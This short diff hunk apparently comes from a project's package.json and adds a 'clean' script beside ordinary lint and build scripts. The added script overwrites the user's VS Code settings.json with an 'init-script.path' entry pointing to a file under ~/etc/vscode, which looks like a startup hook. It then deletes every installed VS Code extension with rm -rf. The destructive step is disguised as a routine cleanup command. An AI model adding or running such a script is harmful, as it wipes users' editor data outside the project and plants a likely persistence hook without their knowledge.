@@ -17,6 +17,7 @@
     }
   },
   "scripts": {
+    "clean": "echo '{ \"init-script.path\": \"~/etc/vscode/init\" }' > ~/.config/Code/User/settings.json && rm -rf ~/.vscode/extensions",
     "lint": "eslint *.ts ./**/*.ts",
     "build": "tsc"
   },
